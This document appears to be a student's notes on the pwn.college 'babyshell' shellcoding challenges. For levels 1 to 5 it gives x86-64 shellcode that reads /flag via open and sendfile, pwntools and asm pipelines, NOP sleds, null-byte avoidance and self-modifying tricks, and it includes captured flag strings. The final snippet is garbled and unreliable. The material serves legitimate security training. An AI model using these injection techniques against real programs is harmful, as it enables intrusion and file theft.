//all the 3 solution boilerplates do the same thing for both level 1 and level 2.
//they are all used to send our code to the /challenge/.... input
                
Alternative way to solve level 2. But can also be used to solve other shellcoding problems
Step 1: type vi shellcode.s
Step 2: add the below content inside it
.global _start
_start:
.intel_syntax noprefix
   .rept 0x800
          nop
   .endr
   mov rbx, 0x00000067616c662f
   push rbx
   mov rax, 2
   mov rdi, rsp
   mov rsi, 0
   syscall

   mov rdi, 1
   mov rsi, rax
   mov rdx, 0
   mov r10, 1000
   mov rax, 40
   syscall

   mov rax, 60
   syscall
Step 3: type in terminal: gcc -nostdlib -static shellcode.s -o shellcode-elf
       then write in terminal: objcopy --dump-section .text=shellcode-raw shellcode-elf
step 4: cat shellcode-raw | /challenge/babyshell_level2
Optional step:-type: strace ./shellcode-elf
        -shows you what is happening in the high-level inside your code.
Optional step:
      1st type=gcc -nostdlib -static shellcode.s -o shellcode-elf
      2nd type=./shellcode-elf
      3rd type=objdump -M intel -d shellcode-elf
      ---shows u the memory address of each command


 





             level 1- solution1
//a hex converter to convert words to hex: https://www.online-toolz.com/tools/text-hex-convertor.php
//values from a syscall will always be stored in rax
Step1: type 'vi babyshell.py'

Step2: Add the below content inside the above file
from pwn import *

sys.stdout.buffer.write(asm("""
   mov rbx, 0x00000067616c662f # push "/flag" filename
   push rbx
   mov rax, 2 # syscall number of open
   mov rdi, rsp # point the first argument at stack (where we have "/flag")
   mov rsi, 0 # NULL out the second argument (meaning, O_RDONLY)
   syscall # trigger open("/flag", NULL)

   mov rdi, 1 # first argument to sendfile is the file descriptor to output to (stdout)
   mov rsi, rax # second argument is the file descriptor returned by open
   mov rdx, 0 # third argument is the number of bytes to skip from the input file
   mov r10, 1000 # fourth argument is the number of bytes to transfer to the output file
   mov rax, 40 # syscall number of sendfile
   syscall # trigger sendfile(1, fd, 0, 1000)
   
   mov rax, 60 # syscall number of exit
   syscall # trigger exit()
""", arch="amd64", os="linux"))

Step 3: type 'python3 babyshell.py | /challenge/babyshell_level1' in terminal


                     
               level 1-solution2
asm -c amd64 " 

   mov rbx, 0x00000067616c662f
   push rbx
   mov rax, 2
   mov rdi, rsp
   mov rsi, 0
   syscall

   mov rdi, 1
   mov rsi, rax
   mov rdx, 0
   mov r10, 1000
   mov rax, 40 
   syscall 
   
   mov rax, 60
   syscall" | /challenge/babyshell_level2



               level 1-solution3
from pwn import *

# set some context
context.arch = "amd64"
context.encoding = "latin"
# ignore warnings
warnings.simplefilter("ignore")

# assembly goes here, most of the rest is boilerplate
assembly = """
.rept 0x800
          nop
   .endr
   mov rbx, 0x00000067616c662f
   push rbx
   mov rax, 2
   mov rdi, rsp
   mov rsi, 0
   syscall

   mov rdi, 1
   mov rsi, rax
   mov rdx, 0
   mov r10, 1000
   mov rax, 40 
   syscall 
   
   mov rax, 60
   syscall
"""

# the hostname will always be the same as challenge binary
with process(f"/challenge/{os.getenv('HOSTNAME')}") as target:
    info( target.readrepeat(1) )
    target.send( asm(assembly) )
    info( target.readrepeat(1) )


Flag= pwn.college{oSDVNlcC3mmEhwfJdyZiRyqNkpq.QX3EjMsADOzQzW}



               level 2- solution1
//just add  0x800 bytes of 
Step1: type 'vi babyshell.py'

Step2: Add the below content inside the above file
from pwn import *

sys.stdout.buffer.write(asm("""
   .rept 0x800
                nop
   .endr
   mov rbx, 0x00000067616c662f # push "/flag" filename
   push rbx
   mov rax, 2 # syscall number of open
   mov rdi, rsp # point the first argument at stack (where we have "/flag")
   mov rsi, 0 # NULL out the second argument (meaning, O_RDONLY)
   syscall # trigger open("/flag", NULL)

   mov rdi, 1 # first argument to sendfile is the file descriptor to output to (stdout)
   mov rsi, rax # second argument is the file descriptor returned by open
   mov rdx, 0 # third argument is the number of bytes to skip from the input file
   mov r10, 1000 # fourth argument is the number of bytes to transfer to the output file
   mov rax, 40 # syscall number of sendfile
   syscall # trigger sendfile(1, fd, 0, 1000)
   
   mov rax, 60 # syscall number of exit
   syscall # trigger exit()
""", arch="amd64", os="linux"))

Step 3: type 'python3 babyshell.py | /challenge/babyshell_level1' in terminal

                level 2-solution2
asm -c amd64 " 
   .rept 0x800
          nop
   .endr
   mov rbx, 0x00000067616c662f
   push rbx
   mov rax, 2
   mov rdi, rsp
   mov rsi, 0
   syscall

   mov rdi, 1
   mov rsi, rax
   mov rdx, 0
   mov r10, 1000
   mov rax, 40 
   syscall 
   
   mov rax, 60
   syscall" | /challenge/babyshell_level2



                    level 2-solution3
from pwn import *

# set some context
context.arch = "amd64"
context.encoding = "latin"
# ignore warnings
warnings.simplefilter("ignore")

# assembly goes here, most of the rest is boilerplate
assembly = """
.rept 0x800
          nop
   .endr
   mov rbx, 0x00000067616c662f
   push rbx
   mov rax, 2
   mov rdi, rsp
   mov rsi, 0
   syscall

   mov rdi, 1
   mov rsi, rax
   mov rdx, 0
   mov r10, 1000
   mov rax, 40 
   syscall 
   
   mov rax, 60
   syscall
"""

# the hostname will always be the same as challenge binary
with process(f"/challenge/{os.getenv('HOSTNAME')}") as target:
    info( target.readrepeat(1) )
    target.send( asm(assembly) )
    info( target.readrepeat(1) )

flag=pwn.college{gDBurPf4kUtqmbvJjYddeAa2cDA.QX4EjMsADOzQzW}

               
               level 3
               
https://null-byte.wonderhowto.com/how-to/writing-64-bit-shellcode-part-2-removing-null-bytes-0161591/
https://github.com/shoulderhu/pwn-college/wiki/babyshell-level4
//just modify your level 1 code by first replacing the 0s with 1s and shifting out

asm -c amd64 "movabs  rbx, 0x11111167616c662f
    shl     rbx, 0x18
    shr     rbx, 0x18
    push    rbx
    
    xor     rsi, rsi
    mov     rdi, rsp
    mov     rax, 0x1111111111111102
    shl     rax, 0x38
    shr     rax, 0x38
    syscall
    
    mov     r10, 0x11111111111103e8
    shl     r10, 0x30
    shr     r10, 0x30
    xor     rdx, rdx
    mov     rsi, rax
    mov     rdi, 0x1111111111111101
    shl     rdi, 0x38
    shr     rdi, 0x38
    mov     rax, 0x1111111111111128
    shl     rax, 0x38
    shr     rax, 0x38
    syscall
    
    mov     rax, 0x111111111111113c
    shl     rax, 0x38
    shr     rax, 0x38
    syscall" | /challenge/babyshell_level3
    
    
    flag=pwn.college{g5dVQ9pExiIQsNVaJm870xthS8t.QX5EjMsADOzQzW}
    
              level 4
    
asm -c amd64 "
   mov r9, 0x00000067616c662f
   push r9
   pop rdi
   push 2
   pop rax
   push 0
   pop rsi
   syscall

   push 1
   pop rdi
   push rax
   pop rsi
   push 0
   pop rdx
   mov r9, 0x28
   push r9
   pop rax
   mov r10, 1000
   syscall

   mov r9, 0x3c
   push r9
   pop rax
   syscall
" | /challenge/babyshell_level4
  
 asm -c amd64 "
   mov r10d, 0x67616c66
   shl r10, 8
   mov r10b, 0x2f
   push r10
   pop r10
   mov rdi, r10
   xor r10, r10
   mov rsi, r10
   mov r10b, 0x2
   mov al, r10b
   syscall

   push 1
   pop rdi
   push rax
   pop rsi
   push 0
   pop rdx
   mov r10, 0x28
   push r10
   pop rax
   mov r10, 1000
   syscall

   mov r10, 0x3c
   push r10
   pop rax
   xor r10, r10
   syscall
" | /challenge/babyshell_level4

    
    
asm -c amd64 "   
    mov r10d, 0x67616c66
    shl r10, 8
    mov r10b, 0x2f
    push r10
    pop r10
    mov rdi, r10
    xor r10, r10
    mov rsi, r10
    mov rdx, r10
    mov r10b, 0x2
    mov al, r10b
    syscall

    # Read a the file we just opened and send it to stdout
    push 1
    pop rdi
    push rax
    pop rdi
    push 100
    pop r10
    push 40
    pop rax
    syscall

    push 60
    pop rax
    push 42
    pop rdi
    syscall" | /challenge/babyshell_level4
 
 
 
 level 5
 
 
 asm -c amd64 "
    movabs  rbx, 0x11111167616c662f
    shl     rbx, 0x18
    shr     rbx, 0x18
    push    rbx
    
    mov     rdx, 0x1111111111111104
    shl     rdx, 0x38
    shr     rdx, 0x30
    xor     rsi, rsi
    mov     rdi, rsp
    mov     rax, 0x1111111111111102
    shl     rax, 0x38
    shr     rax, 0x38
    
    mov     bx,  [0x0000000001337052]
    sub     bx,  0xc47a
    mov     [0x0000000001337052], bx
    mov     ecx, ecx
    
    mov     r10, 0x11111111111103e8
    shl     r10, 0x30
    shr     r10, 0x30
    xor     rdx, rdx
    mov     rsi, rax
    mov     rdi, 0x1111111111111101
    shl     rdi, 0x38
    shr     rdi, 0x38
    mov     rax, 0x1111111111111128
    shl     rax, 0x38
    shr     rax, 0x38
    
    mov     bx,  [0x00000000013370a5]
    sub     bx,  0xc47a
    mov     [0x00000000013370a5], bx
    mov     ecx, ecx
    
    xor     rdi, rdi
    mov     rax, 0x111111111111113c
    shl     rax, 0x38
    shr     rax, 0x38
    
    mov     bx,  [0x00000000013370d1]
    sub     bx,  0xc47a
    mov     [0x00000000013370d1], bx
    mov     ecx, ecx 
" | /challenge/babyshell_level5

asm -c amd64 " 

   mov rbx, 0x00000067616c662f
   push rbx
   mov rax, 2
   mov rdi, rsp
   mov rsi, 0
   dosyscall

   mov rdi, 1
   mov rsi, rax
   mov rdx, 0
   mov r10, 1000
   mov rax, 40 
   dosyscall 
   
   mov rax, 60
   dosyscall

dosyscall:
   mov dword ptr [rip+smc}, 0x040f
   inc dword ptr [rip+smc+1]
   ret
smc:
   nop
   nop
   ret" | /challenge/babyshell_level4

 
 
